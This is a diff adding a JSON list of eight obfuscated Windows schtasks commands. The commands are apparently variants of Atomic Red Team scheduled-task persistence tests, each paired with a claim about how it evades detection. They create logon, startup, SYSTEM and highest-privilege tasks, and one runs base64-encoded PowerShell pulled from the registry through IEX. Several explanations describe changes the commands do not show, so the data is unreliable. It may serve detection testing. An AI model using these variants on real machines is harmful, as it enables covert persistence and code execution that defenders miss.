@@ -1,0 +1,34 @@
+[
+  {
+    "output": "schtasks  /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10",
+    "explanation": "Used insertion of extra spaces and substitution of double backslashes to bypass detection while maintaining the same functionality."
+  },
+  {
+    "output": "schtasks  /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10",
+    "explanation": "Replaced forward slashes with backslashes in the file path and added extra spaces to evade signature-based detection."
+  },
+  {
+    "output": "schtasks  /Create /TN \"CompMgmtBypass\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F",
+    "explanation": "Used quotes around the task name and path, and added extra spaces to avoid direct keyword detection."
+  },
+  {
+    "output": "schtasks  /Create /TN \"EventViewerBypass\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F",
+    "explanation": "Inserted extra spaces and used quotes to obfuscate the command while preserving its original behavior."
+  },
+  {
+    "output": "schtasks  /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"",
+    "explanation": "Used lowercase command and inserted extra spaces to avoid detection based on case sensitivity or spacing patterns."
+  },
+  {
+    "output": "schtasks  /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"",
+    "explanation": "Reordered arguments and added extra spaces to evade detection by altering the command structure."
+  },
+  {
+    "output": "schtasks.exe  /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45",
+    "explanation": "Escaped quotes and added extra spaces to obfuscate the command while maintaining its original functionality."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"test\" /tr \"cmd.exe\" /f",
+    "explanation": "Used quotes around the task name and path, and inserted extra spaces to avoid direct keyword detection."
+  }
+]
